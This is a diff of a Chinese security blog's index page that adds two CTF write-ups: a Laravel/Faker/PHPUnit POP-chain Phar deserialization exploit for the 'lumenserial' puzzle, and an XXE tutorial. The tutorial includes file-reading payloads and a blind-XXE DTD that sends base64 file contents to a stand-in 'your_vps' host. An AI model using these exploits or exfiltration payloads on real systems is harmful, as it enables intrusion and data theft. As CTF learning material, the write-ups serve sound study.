@@ -90,6 +90,358 @@
     
         <article class="post">
             <h1>
+                <a class="title" href="/2019/01/09/Code-breaking-medium֮lumenserial/"> 
+                    Code-breaking-medium之lumenserial 
+                </a>
+            </h1>
+                        <div class="meta">
+                <a class="date"> 
+                    <i class="fa fa-calendar" aria-hidden="true"></i>                    
+                    2019-01-09   
+                </a>
+                
+                
+                
+                <a class="tag">
+                    <i class="fa fa-tags" aria-hidden="true"></i>  
+                </a>
+                
+                    <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/代码审计/">代码审计</a></li></ul>
+            </div>
+            <div class="content">
+                
+                <h1 id="Code-breaking-medium之lumenserial"><a href="#Code-breaking-medium之lumenserial" class="headerlink" title="Code-breaking-medium之lumenserial"></a>Code-breaking-medium之lumenserial</h1><p>一道pop链很深的题，复现了一天，到目前已经有九个人做了。太菜了，只能照着柠檬和kk师傅的wp来学习思路。通过这次的复现，感受到耐心对审计的importance。记录一下在学习wp过程中得到的他见与己见。</p>
+<p>题目地址：<a href="https://code-breaking.com/puzzle/7/" target="_blank" rel="noopener">https://code-breaking.com/puzzle/7/</a></p>
+<h1 id="前期"><a href="#前期" class="headerlink" title="前期"></a>前期</h1><p>一个ueditor的页面</p>
+<p>在App\Http\Controllers的EditorController.php里提供了远程下载功能</p>
+<pre><code>private function download($url)
+{
+    $content = file_get_contents($url);</code></pre><p>url可控为以GET形式传入的source值，由于禁止了以下函数，所以只能利用Phar反序列化再打通pop链</p>
+<pre><code>system,shell_exec,passthru,exec,popen,proc_open,pcntl_exec,mail,apache_setenv,mb_send_mail,dl,set_time_limit,ignore_user_abort,symlink,link,error_log</code></pre><h1 id="Searching-POP-chain"><a href="#Searching-POP-chain" class="headerlink" title="Searching POP chain"></a>Searching POP chain</h1><p>因为phar反序列化不会反序列化类中的具体函数，所以要找两个魔法方法入口：<code>__destruct|__wakeup</code>这点在柠檬师傅的博客园看到的，也算是经验之谈了。</p>
+<p>首先在namespace Illuminate\Broadcasting里找到PendingBroadcast类存在destruct</p>
+<pre><code>class PendingBroadcast
+{   
+public function __construct(Dispatcher $events, $event)
+{
+    $this-&gt;event = $event;
+    $this-&gt;events = $events;
+}
+public function __destruct()
+    {
+        $this-&gt;events-&gt;dispatch($this-&gt;event);
+    }
+}</code></pre><p>Dispatcher是一个接口，所以这里$event、$events应该都是一个继承于这个接口的obj。但是看了下，一共就只有两个类继承于Dispatcher(BusFake、EventFake)，且都无法利用。所以转向去寻找存在__call方法的类，看是否可以利用。</p>
+<p>为什么要找存在_call方法的类的？根据PHP文档，当一个类里没有定义的方法时，在执行这个不存在方法时，它就会自动调用该类里的__call方法来实现方法重载。</p>
+<p>所以要找一个有_call方法的类–&gt;类ValidGenerator。</p>
+<h1 id="ValidGenerator"><a href="#ValidGenerator" class="headerlink" title="ValidGenerator"></a>ValidGenerator</h1><pre><code>public function __call($name, $arguments)
+{
+    $i = 0;
+    do {
+        $res = call_user_func_array(array($this-&gt;generator, $name), $arguments);
+        $i++;
+        if ($i &gt; $this-&gt;maxRetries) {
+            throw new \OverflowException(sprintf(&#39;Maximum retries of %d reached without finding a valid value&#39;, $this-&gt;maxRetries));
+        }
+    } while (!call_user_func($this-&gt;validator, $res));
+
+    return $res;
+}</code></pre><p>$name的值就是dispatch。如果我们能控制$res，就相当于能控制call_user_func的函数和参数</p>
+<p>由于在call_user_func_array()中，Generator类没有定义dispatch函数，所以又会调用Generator类的_call函数，跟进Generator类</p>
+<h1 id="Generator类"><a href="#Generator类" class="headerlink" title="Generator类"></a>Generator类</h1><pre><code>public function __call($method, $attributes) 
+{
+    return $this-&gt;format($method, $attributes);
+}</code></pre><p>继续跟进format方法</p>
+<pre><code>public function format($formatter, $arguments = array())
+{
+    return call_user_func_array($this-&gt;getFormatter($formatter), $arguments);  
+}</code></pre><p>$formatter的值不可控，且初值为dispatch，继续跟进getFormatter()</p>
+<pre><code>public function getFormatter($formatter)
+{
+    if (isset($this-&gt;formatters[$formatter])) {
+        return $this-&gt;formatters[$formatter];
+    }</code></pre><p>在这步似乎看到了希望，因为它return 了一个数组的值，就比较好控。想办法让<strong>$this-&gt;getFormatter($formatter)</strong>的值是一个数组，即第一次<strong>getFormatter()</strong>返回的值是数组。数组只有一个值仍为<strong>getFormatter</strong>，此时$arguemnts为空，因为call_user_func_array，它就会再调用一次getFormatter方法，参数为空。</p>
+<p>根据getFormatter方法当参数为空时，返回formatters成员的第一个值。</p>
+<p>所以我们需要有两个Generator类：第一个类的formatters成员的键名为dispacth，键值为一个数组(内容为第二个Generator类名$ob2、方法名getFormatter);第二个Generator类的formatters键名随意，键值为我们想要控制的类,此时$res就算可控了。</p>
+<h1 id="回身处理validator"><a href="#回身处理validator" class="headerlink" title="回身处理validator"></a>回身处理validator</h1><p>那么$this-&gt;validator如何处理呢？</p>
+<p>这里看到师傅们找的了一个跳板类，赋值给了validator</p>
+<p><code>phpunit\phpunit\src\Framework\MockObject\Stub\ReturnCallback.php:26</code></p>
+<pre><code>namespace PHPUnit\Framework\MockObject\Stub;
+class ReturnCallback implements Stub
+{
+public function invoke(Invocation $invocation)
+{
+    return \call_user_func_array($this-&gt;callback, $invocation-&gt;getParameters());
+}</code></pre><h2 id="invocation接口实现方法"><a href="#invocation接口实现方法" class="headerlink" title="invocation接口实现方法"></a>invocation接口实现方法</h2><p>getParameters()是接口的一个方法，用来访问私有属性parameters的值</p>
+<p>找到调用这个接口的类就行了，这里是</p>
+<pre><code>namespace PHPUnit\Framework\MockObject\Invocation;
+class StaticInvocation implements Invocation, SelfDescribing
+{
+private $parameters;
+}</code></pre><p>这个类可以通过上面getFormatter方法控制。至此，invoke()里call_user_func_array中的两个参数我们都可控了</p>
+<h2 id="构建POC思路"><a href="#构建POC思路" class="headerlink" title="构建POC思路"></a>构建POC思路</h2><p>给validator一个数组(内容为实例化的ReturenCallback类、invoke方法名)。即$this-&gt;validator参数就成了invoke()，从而让call_user_func调用invoke方法，invoke方法中的Call_user_func_arrary再执行可控函数来getshell</p>
+<p>总结一下，Invoke的回调函数能getshell的原因有二：<br>1、$this-&gt;callback 反序列化可控<br>2、继承invocation的类名返回值可控(getFormatter实现)</p>
+<h1 id="Final-EXP"><a href="#Final-EXP" class="headerlink" title="Final-EXP"></a>Final-EXP</h1><p>看到kk师傅有一个exp写的很好，把审计流程串成EXP，稍作改动，这里贴出来学习下</p>
+<pre><code>&lt;?php
+namespace Illuminate\Broadcasting{
+    class PendingBroadcast{
+        function __construct(){
+            $this-&gt;events = new \Faker\ValidGenerator();
+            $this-&gt;event = &#39;everything&#39;;
+        }
+    }
+}
+
+namespace PHPUnit\Framework\MockObject\Invocation{
+    class StaticInvocation{
+        function __construct(){
+            $this-&gt;parameters = array(&#39;/var/www/html/upload/hpdoger.php&#39;,&#39;&lt;?php print_r(file_get_contents(&#39;../../flag_larave1_b0ne&#39;));?&gt;&#39;);
+        }
+    }
+}
+
+namespace PHPUnit\Framework\MockObject\Stub{
+    class ReturnCallback{
+        function __construct(){
+            $this-&gt;callback = &#39;file_put_contents&#39;;
+        }
+    }
+}
+
+namespace Faker{
+    class ValidGenerator{
+        function __construct(){
+            $evilobj = new \PHPUnit\Framework\MockObject\Invocation\StaticInvocation();
+            $g1 = new \Faker\Generator(array(&#39;everything&#39; =&gt; $evilobj ));
+            $g2 = new \Faker\Generator(array(&quot;dispatch&quot; =&gt; array($g1, &quot;getFormatter&quot;)));
+
+            $rc = new \PHPUnit\Framework\MockObject\Stub\ReturnCallback();
+
+            $this-&gt;validator = array($rc, &quot;invoke&quot;);
+            $this-&gt;generator = $g2;
+            $this-&gt;maxRetries = 10000;
+        }
+    }
+
+    class Generator{
+        function __construct($form){
+            $this-&gt;formatters = $form;
+        }
+    }
+
+}
+namespace{
+    $exp = new Illuminate\Broadcasting\PendingBroadcast();
+    print_r(urlencode(serialize($exp)));
+
+    // phar
+    $p = new Phar(&#39;./hpdoger.phar&#39;, 0);
+    $p-&gt;startBuffering();
+    $p-&gt;setStub(&#39;GIF89a&lt;?php __HALT_COMPILER(); ?&gt;&#39;);
+    $p-&gt;setMetadata($exp);
+    $p-&gt;addFromString(&#39;1.txt&#39;,&#39;text&#39;);
+    $p-&gt;stopBuffering();
+}</code></pre><p>上传文件，接着进行反序列化</p>
+<pre><code>http://51.158.73.123:8080/server/editor?action=Catchimage&amp;source[]=phar:///var/www/html/upload/image/9af04fac3af8c9d11572234ca3c4c98b/201901/09/26b5b639d9f75a9426cf.gif</code></pre><p><img src="https://i.loli.net/2019/01/09/5c35f967d6ab3.png" alt></p>
+<p>再次膜前辈师傅们</p>
+
+                
+            </div>
+            <div class="continue">
+            <a href="/2019/01/09/Code-breaking-medium֮lumenserial/">
+            继续阅读            <i class="fa fa-angle-right" aria-hidden="true"></i>
+            </a>
+            </div>
+        </article>
+        
+        <article class="post">
+            <h1>
+                <a class="title" href="/2019/01/07/从两道CTF题目学习XXE漏洞/"> 
+                    从两道CTF题目学习XXE漏洞 
+                </a>
+            </h1>
+                        <div class="meta">
+                <a class="date"> 
+                    <i class="fa fa-calendar" aria-hidden="true"></i>                    
+                    2019-01-07   
+                </a>
+                
+                
+                
+                <a class="tag">
+                    <i class="fa fa-tags" aria-hidden="true"></i>  
+                </a>
+                
+                    <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/XXE/">XXE</a></li></ul>
+            </div>
+            <div class="content">
+                
+                <h1 id="从两道CTF题目学习XXE漏洞"><a href="#从两道CTF题目学习XXE漏洞" class="headerlink" title="从两道CTF题目学习XXE漏洞"></a>从两道CTF题目学习XXE漏洞</h1><p>接触安全到现在，一直没有碰xxe相关的知识。一是觉得xml类型的东西太概念化了，二是觉得实用性不大，因为现在很少见到用xml形式来传输数据。不巧的是最近35CTF就有一道blind xxe题目，干脆把之前的坑填了，从零来学习一下XXE漏洞</p>
+<h1 id="XML相关知识"><a href="#XML相关知识" class="headerlink" title="XML相关知识"></a>XML相关知识</h1><h2 id="什么是XML"><a href="#什么是XML" class="headerlink" title="什么是XML"></a>什么是XML</h2><p>XML被设计为传输和存储数据，其焦点是数据的内容，其把数据从HTML分离，是独立于软件和硬件的信息传输工具。</p>
+<p><strong>通俗点来说就是存储数据的一种格式</strong><br><img src="https://i.loli.net/2019/01/06/5c319a94ce60c.jpg" alt><br>它的形式类似于html，都是标签闭合，且有根元素和子元素说法，例如note就是根元素，from和to都是子元素</p>
+<h2 id="什么是实体"><a href="#什么是实体" class="headerlink" title="什么是实体"></a>什么是实体</h2><p>实体有以下四种：</p>
+<ul>
+<li>内置实体 (Built-in entities)</li>
+<li>字符实体 (Character entities)</li>
+<li>通用实体 (General entities)</li>
+<li>参数实体 (Parameter entities)</li>
+</ul>
+<p><strong>实体根据引用方式，还可分为内部实体与外部实体。</strong>这里简要说一下内部实体和引发XXE漏洞的外部实体、参数实体</p>
+<h3 id="内部实体"><a href="#内部实体" class="headerlink" title="内部实体"></a>内部实体</h3><p>即在xml文档中自定义一个实体<br>格式：<code>&lt;!ENTITY 实体名称 &quot;实体的值&quot;&gt;</code>，这是一种引入形式，好比C中引入变量都要声明变量，只不过在XML里引入的不叫变量，而叫做<strong>实体</strong></p>
+<p><img src="https://i.loli.net/2019/01/06/5c31a36c41df0.png" alt></p>
+<h3 id="外部实体"><a href="#外部实体" class="headerlink" title="外部实体"></a>外部实体</h3><p>格式：<code>&lt;!ENTITY 实体名称 SYSTEM &quot;URI&quot;&gt;</code>，在xml里不给实体赋予具体的值，而是通过某URI引入，叫做外部实体引入</p>
+<p>下面是支持使用的URI<br><img src="https://thief.one/upload_image/20170620/1.png" alt></p>
+<p>关于外部实体引用file协议的例子如下：</p>
+<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
+&lt;!DOCTYPE root [&lt;!ENTITY  file SYSTEM &quot;file:///etc/passwd&quot;&gt;]&gt;
+&lt;root&gt;&amp;file;&lt;/root&gt;</code></pre><h3 id="参数实体"><a href="#参数实体" class="headerlink" title="参数实体"></a>参数实体</h3><pre><code>&lt;!ENTITY % 实体名称 &quot;实体的值&quot;&gt;
+或者
+&lt;!ENTITY % 实体名称 SYSTEM &quot;URI&quot;&gt;</code></pre><p>外部引入参数实体的例子：</p>
+<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
+&lt;!DOCTYPE a [
+    &lt;!ENTITY % name SYSTEM &quot;file:///etc/passwd&quot;&gt;
+    %name;
+]&gt;</code></pre><p>注意:%name（参数实体）是<strong>在DTD中被引用</strong>的，而其余实体是在xml文档中被引用的。</p>
+<h2 id="什么是DTD"><a href="#什么是DTD" class="headerlink" title="什么是DTD"></a>什么是DTD</h2><p>W3C定义：DTD即文档类型定义（document type define）,可定义合法的XML文档构建模块。它使用一系列合法的元素来定义文档的结构。<br>DTD 可被成行地声明于 XML 文档中，也可作为一个外部引用。</p>
+<p>我理解的DTD是构建一个区域，声明在区域中要引入的实体\元素</p>
+<h3 id="内部声明DTD"><a href="#内部声明DTD" class="headerlink" title="内部声明DTD"></a>内部声明DTD</h3><p>语法：<code>&lt;!DOCTYPE 根元素 [元素声明]&gt;</code></p>
+<p><img src="https://i.loli.net/2019/01/06/5c319fbbd03ee.png" alt></p>
+<p>即在xml文档内部用DTD声明：我的根元素是root，在根元素下有to、from这些元素。</p>
+<p>其实，你声明的元素和下面的元素名称不对应时也会进行解析。所以我觉得用DTD的用处就是给使用者一个目录栏，为了告诉他们下面的元素结构是什么样子的，而目录栏标题的名字是否正确不做强制要求。</p>
+<p><strong>PS：#PCDATA的意思是解析字符数据</strong></p>
+<h3 id="外部声明DTD"><a href="#外部声明DTD" class="headerlink" title="外部声明DTD"></a>外部声明DTD</h3><p>语法：<code>&lt;!DOCTYPE 根元素 SYSTEM &quot;文件名&quot;&gt;</code>,即引入外部的dtd声明,其中dtd文件就是引入的实体</p>
+<p><img src="https://i.loli.net/2019/01/06/5c31a1a35b693.png" alt></p>
+<h1 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h1><p>XXE漏洞全称XML External Entity Injection即xml外部实体注入漏洞，XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件，造成文件读取、命令执行、内网端口扫描、攻击内网网站、发起dos攻击等危害。</p>
+<p>上文的外部实体引入部分，可以调用URI来加载数据，这也是造成漏洞点的地方。</p>
+<h2 id="有回显的XXE"><a href="#有回显的XXE" class="headerlink" title="有回显的XXE"></a>有回显的XXE</h2><p>jarvisoj平台上的题目</p>
+<p>题目描述：请设法获得目标机器/home/ctf/flag.txt中的flag值</p>
+<p><img src="https://i.loli.net/2019/01/06/5c31b29f0180e.png" alt></p>
+<h2 id="35CTF-Blind-XXE"><a href="#35CTF-Blind-XXE" class="headerlink" title="35CTF Blind XXE"></a>35CTF Blind XXE</h2><p>这个是XXE漏洞能够利用的普遍场景，一般能利用XXE的地方有回显的机率几乎为0。利用blind xxe把数据外带到自己的服务器</p>
+<h3 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h3><p>代码如下：</p>
+<pre><code>&lt;?php
+  function __autoload($cls) {
+    include $cls;
+  }
+
+  class Black {
+    public function __construct($string, $default, $keyword, $store) {
+      if ($string) ini_set(&quot;highlight.string&quot;, &quot;#0d0d0d&quot;);
+      if ($default) ini_set(&quot;highlight.default&quot;, &quot;#0d0d0d&quot;);
+      if ($keyword) ini_set(&quot;highlight.keyword&quot;, &quot;#0d0d0d&quot;);
+
+      if ($store) {
+            setcookie(&#39;theme&#39;, &quot;Black-&quot;.$string.&quot;-&quot;.$default.&quot;-&quot;.$keyword, 0, &#39;/&#39;);
+      }
+    }
+  }
+
+  class Green {
+    public function __construct($string, $default, $keyword, $store) {
+      if ($string) ini_set(&quot;highlight.string&quot;, &quot;#00fb00&quot;);
+      if ($default) ini_set(&quot;highlight.default&quot;, &quot;#00fb00&quot;);
+      if ($keyword) ini_set(&quot;highlight.keyword&quot;, &quot;#00fb00&quot;);
+
+      if ($store) {
+            setcookie(&#39;theme&#39;, &quot;Green-&quot;.$string.&quot;-&quot;.$default.&quot;-&quot;.$keyword, 0, &#39;/&#39;);
+      }
+    }
+  }
+
+  if ($_=@$_GET[&#39;theme&#39;]) {
+    if (in_array($_, [&quot;Black&quot;, &quot;Green&quot;])) {
+      if (@class_exists($_)) {
+        ($string = @$_GET[&#39;string&#39;]) || $string = false;
+        ($default = @$_GET[&#39;default&#39;]) || $default = false;
+        ($keyword = @$_GET[&#39;keyword&#39;]) || $keyword = false;
+
+        new $_($string, $default, $keyword, @$_GET[&#39;store&#39;]);
+      }
+    }
+  } else if ($_=@$_COOKIE[&#39;theme&#39;]) {
+    $args = explode(&#39;-&#39;, $_);
+    if (class_exists($args[0])) {
+      new $args[0]($args[1], $args[2], $args[3], &#39;&#39;);
+    }
+  } else if ($_=@$_GET[&#39;info&#39;]) {
+    phpinfo();
+  }
+
+  highlight_file(__FILE__);</code></pre><p>关于代码逻辑部分简单说一下：</p>
+<p>theme、string、default、keyword参数决定cookie，如果cookie存在则对cookie的四个参数以“-”号分割处理：把第一部分当作类名、其余三部分当作初始参数进行实例化。</p>
+<p>__autoload()方法没什么用，因为php7.2+以后此方法被废弃了，而环境刚好是7.21，所以是出题人用来混淆的。</p>
+<p>既然代码没什么可用的类，就看看能不能实例化可以用的php原生类，这里复盘，SimpleXMlElement可用</p>
+<p>关于这个类的具体使用介绍：<a href="http://php.net/manual/zh/class.simplexmlelement.php" target="_blank" rel="noopener">http://php.net/manual/zh/class.simplexmlelement.php</a></p>
+<p>这里仅仅大致用法：<br><img src="https://upload-images.jianshu.io/upload_images/9113969-80306fef674a47a0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/9113969-8f4614644b563b5f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
+<p>所以思路就是Blind XXE，让服务器远程解析我们服务器上的xml，获取的数据再次发送到我们的服务器上。</p>
+<p>一开始构造xml的poc花了半天时间，主要踩了两个坑：</p>
+<p>1、在内部DTD声明中，参数实体不能嵌套参数实体使用，即下方的用法是不允许的，：</p>
+<pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;
+
+&lt;!DOCTYPE ANY[
+
+&lt;!ENTITY % file &quot;hpdoger&quot;&gt;
+&lt;!ENTITY % send SYSTEM &#39;http://vps/?file=%file;&#39;&gt;
+
+%send;
+]&gt;</code></pre><p>只能引入外部声明DTD才能进行<strong>参数实体嵌套使用</strong>，但是嵌套使用还必须满足下面的一个条件</p>
+<p>2、 这点是key师傅点播到的：在引入外部DTD声明之后，想要嵌套其它参数实体就必须要用一个“中间参数实体”去搭桥，这个中间参数实体可以理解为eval。具体实现方法看下面的POC</p>
+<h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><p>vps上的xml文件如下：</p>
+<pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;
+
+&lt;!DOCTYPE ANY[
+
+&lt;!ENTITY % send SYSTEM &#39;http://your_vps/test2.dtd&#39;&gt;
+
+%send;
+%test;
+%back;
+]&gt;</code></pre><p>vps上的外部DTD声明文件test2.dtd如下：</p>
+<pre><code>&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///flag&quot;&gt;
+
+&lt;!ENTITY % test &quot;&lt;!ENTITY &amp;#37; back SYSTEM &#39;http://your_vps/?file=%file;&#39;&gt;&quot;&gt;</code></pre><p>用Curl发送请求，–cookie指定请求cookie参数</p>
+<pre><code>curl -v --cookie &quot;theme=SimpleXMlElement-http://your_vps/xxe.xml-2-true&quot; &quot;http://35.207.132.47:82&quot;</code></pre><p>查看web日志即能看到base64加密的flag<br><img src="https://i.loli.net/2019/01/06/5c31fa6b43153.png" alt></p>
+<p>其中：</p>
+<ul>
+<li>外部实体send引入外部DTD声明</li>
+<li>参数实体test即为“中间参数实体”</li>
+<li>&#37;为了避免编码问题</li>
+<li>base64-encode是防止文件内容有空格导致http传输时被截断</li>
+</ul>
+<h1 id="题外话"><a href="#题外话" class="headerlink" title="题外话"></a>题外话</h1><h2 id="关于FUZZ"><a href="#关于FUZZ" class="headerlink" title="关于FUZZ"></a>关于FUZZ</h2><p>关于服务端接收请求，如果已经有lnmp的环境最好。没有的话，这里推荐两个项目：</p>
+<ol>
+<li><p>TheTwitchy:<a href="https://github.com/TheTwitchy/xxer" target="_blank" rel="noopener">https://github.com/TheTwitchy/xxer</a></p>
+</li>
+<li><p>docker快速搭建lnmp+ssh(自己的项目求start:):</p>
+</li>
+</ol>
+<p><a href="https://github.com/Hpd0ger/docker-lnmp" target="_blank" rel="noopener">https://github.com/Hpd0ger/docker-lnmp</a></p>
+<h2 id="关于XXE漏洞挖掘"><a href="#关于XXE漏洞挖掘" class="headerlink" title="关于XXE漏洞挖掘"></a>关于XXE漏洞挖掘</h2><p>XML作为介质传输流程应该是这样的：</p>
+<p>用户传输敏感数据-&gt;xml形式传输-&gt;后端解析xml(loadXML)-&gt;将各DOM节点转化为SimpleXML节点(最终为数组形式，节点名为键名，节点值为键值)-&gt;提取对应节点键值-&gt;数据提取/用户判断</p>
+<p>漏洞点就在后端解析xml。</p>
+<p>当后端使用<strong>loadXML()</strong>的方法解析xml文档时，会解析恶意xml语句即外部实体的引用，从而造成漏洞。</p>
+<p>在挖掘漏洞的时候尤其注意两点：</p>
+<ol>
+<li>content-type: application/xml</li>
+<li>xml形式的数据传输e.g:<code>&lt;user&gt;admin&lt;/user&gt;</code></li>
+</ol>
+<h2 id="关于防御"><a href="#关于防御" class="headerlink" title="关于防御"></a>关于防御</h2><ol>
+<li><p>对于PHP，禁止引用外部实体</p>
+<pre><code>libxml_disable_entity_loader(true);</code></pre></li>
+<li><p>对于其它语言，其实做好过滤就行了。但是很少见到用xml形式的数据传输了..说多了也没啥用</p>
+</li>
+</ol>
+
+                
+            </div>
+            <div class="continue">
+            <a href="/2019/01/07/从两道CTF题目学习XXE漏洞/">
+            继续阅读            <i class="fa fa-angle-right" aria-hidden="true"></i>
+            </a>
+            </div>
+        </article>
+        
+        <article class="post">
+            <h1>
                 <a class="title" href="/2018/12/21/Code-Breaking-Puzzles WriteUp/"> 
                     Code-Breaking-Puzzles WriteUp 
                 </a>
@@ -193,7 +545,7 @@ if(&#39;;&#39; === preg_replace(&#39;/[^\W]+\((?R)?\)/&#39;, &#39;&#39;, $_GET[&
             </div>
             <div class="continue">
             <a href="/2018/12/21/Code-Breaking-Puzzles WriteUp/">
-            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
+            继续阅读            <i class="fa fa-angle-right" aria-hidden="true"></i>
             </a>
             </div>
         </article>
@@ -391,7 +743,7 @@ if(file_exists(&#39;z.tar.gz&#39;)){
             </div>
             <div class="continue">
             <a href="/2018/12/20/SWPUCTF2018 Write up/">
-            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
+            继续阅读            <i class="fa fa-angle-right" aria-hidden="true"></i>
             </a>
             </div>
         </article>
@@ -439,7 +791,7 @@ if(file_exists(&#39;z.tar.gz&#39;)){
             </div>
             <div class="continue">
             <a href="/2018/12/17/HCTF2018线下赛感想/">
-            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
+            继续阅读            <i class="fa fa-angle-right" aria-hidden="true"></i>
             </a>
             </div>
         </article>
@@ -591,7 +943,7 @@ replay();</code></pre><p>就可以在cache Storage里看到500ms刷新并覆盖�
             </div>
             <div class="continue">
             <a href="/2018/11/14/RootkitXSS֮ServiceWorker/">
-            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
+            继续阅读            <i class="fa fa-angle-right" aria-hidden="true"></i>
             </a>
             </div>
         </article>
@@ -685,7 +1037,7 @@ cookie传入参数login_data解析查库，用了json_decode，那么就可以�
             </div>
             <div class="continue">
             <a href="/2018/11/13/HCTF题解/">
-            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
+            继续阅读            <i class="fa fa-angle-right" aria-hidden="true"></i>
             </a>
             </div>
         </article>
@@ -723,7 +1075,7 @@ cookie传入参数login_data解析查库，用了json_decode，那么就可以�
             </div>
             <div class="continue">
             <a href="/2018/10/22/ISCC2018 信阳杯线下赛小结/">
-            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
+            继续阅读            <i class="fa fa-angle-right" aria-hidden="true"></i>
             </a>
             </div>
         </article>
@@ -998,7 +1350,7 @@ $phar-&gt;stopBuffering();
             </div>
             <div class="continue">
             <a href="/2018/09/13/四个实例递进php反序列化/">
-            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
+            继续阅读            <i class="fa fa-angle-right" aria-hidden="true"></i>
             </a>
             </div>
         </article>
@@ -1125,120 +1477,7 @@ select * from a into outfile &quot;C:\\Documents and Settings\\All Users\\「开
             </div>
             <div class="continue">
             <a href="/2018/09/08/基于Windows下mysql的一些提权分析/">
-            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
-            </a>
-            </div>
-        </article>
-        
-        <article class="post">
-            <h1>
-                <a class="title" href="/2018/08/25/Phpstorm + phpstudy + Xdebug代码审计环境/"> 
-                    Phpstorm + phpstudy + Xdebug代码审计环境 
-                </a>
-            </h1>
-                        <div class="meta">
-                <a class="date"> 
-                    <i class="fa fa-calendar" aria-hidden="true"></i>                    
-                    2018-08-25   
-                </a>
-                
-                
-                
-                <a class="tag">
-                    <i class="fa fa-tags" aria-hidden="true"></i>  
-                </a>
-                
-                    <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/代码审计/">代码审计</a></li></ul>
-            </div>
-            <div class="content">
-                
-                <h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p>硬着头皮挖了一些，也算是完成了之前一个月内出cve的任务：<br>1、YFCMF:<a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-16431" target="_blank" rel="noopener">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-16431</a><br>2、SQL in Bluecms1.6:<a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-16432" target="_blank" rel="noopener">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-16432</a><br>3、XSS in Semcms:<a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-16433" target="_blank" rel="noopener">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-16433</a><br>4、SQL in Semcms:<a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-16434" target="_blank" rel="noopener">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-16434</a></p>
-<p>但想学好代码审计还有很长的路要走，勿忘初心，开始正题~</p>
-<h2 id="搭建环境"><a href="#搭建环境" class="headerlink" title="搭建环境"></a>搭建环境</h2><h3 id="安装php-xdebug-dll"><a href="#安装php-xdebug-dll" class="headerlink" title="安装php_xdebug.dll"></a>安装php_xdebug.dll</h3><p>phpstudy自带各版本的xdebug.dll插件</p>
-<p>在相应目录，如5.6.27版本下的在：phpStudy\PHPTutorial\php\php-5.6.27-nts\ext\php_xdebug.dll</p>
-<h3 id="配置php-ini"><a href="#配置php-ini" class="headerlink" title="配置php.ini"></a>配置php.ini</h3><p>php.ini在相应目录，如5.6.27版本下的在：\phpStudy\PHPTutorial\php\php-5.6.27-nts\php.ini</p>
-<p>在Xdebug部分加如下内容：</p>
-<pre><code>[XDebug]
-zend_extension=&quot;D:\phpStudy\PHPTutorial\php\php-5.6.27-nts\ext\php_xdebug.dll&quot;
-xdebug.profiler_append = 0
-xdebug.profiler_enable = 1
-xdebug.profiler_enable_trigger = 0
-xdebug.profiler_output_dir=&quot;D:\phpStudy\PHPTutorial\tmp\xdebug&quot;
-xdebug.trace_output_dir=&quot;D:\phpStudy\PHPTutorial\tmp\xdebug&quot;
-xdebug.profiler_output_name = &quot;cache.out.%t-%s&quot;
-xdebug.remote_enable = 1
-xdebug.remote_handler = &quot;dbgp&quot;
-xdebug.remote_host = &quot;127.0.0.1&quot;
-xdebug.remote_port = 9000
-xdebug.idekey = PHPSTORM</code></pre><p>zend_extension：插件地址<br>xdebug.remote_port = 9000 : Xdebug监听地址<br>xdebug.idekey = PHPSTORM： idekey名称（与后面设置对应）</p>
-<h3 id="设置php解释器"><a href="#设置php解释器" class="headerlink" title="设置php解释器"></a>设置php解释器</h3><p>![](Delete Link<br><a href="https://i.loli.net/2018/08/25/5b8157cb1f00f.png" target="_blank" rel="noopener">https://i.loli.net/2018/08/25/5b8157cb1f00f.png</a>)</p>
-<p>这里我用的是5.6.27版本的</p>
-<h3 id="设置xdebug参数"><a href="#设置xdebug参数" class="headerlink" title="设置xdebug参数"></a>设置xdebug参数</h3><p>Debug里设置监听地址：<br><img src="https://i.loli.net/2018/08/25/5b8157cb63338.jpg" alt></p>
-<p>接着设置代理：<br><img src="https://i.loli.net/2018/08/25/5b8157cb56aba.jpg" alt></p>
-<h3 id="配置Debug"><a href="#配置Debug" class="headerlink" title="配置Debug"></a>配置Debug</h3><p>运行–&gt;编辑配置</p>
-<p>Defaults–&gt;Web Page<br><img src="https://i.loli.net/2018/08/25/5b8157cb673a3.png" alt></p>
-<p>新增一个服务端，填写信息如图，要点击应用和确认<br><img src="https://i.loli.net/2018/08/25/5b8157cb55242.png" alt></p>
-<p>回到上级页面后别忘了选择刚才添加的server</p>
-<h3 id="浏览器安装debug插件"><a href="#浏览器安装debug插件" class="headerlink" title="浏览器安装debug插件"></a>浏览器安装debug插件</h3><p>下面我是使用火狐的插件xdebug-ext进行调试，因为审计用得比较多的就是火狐了插件多</p>
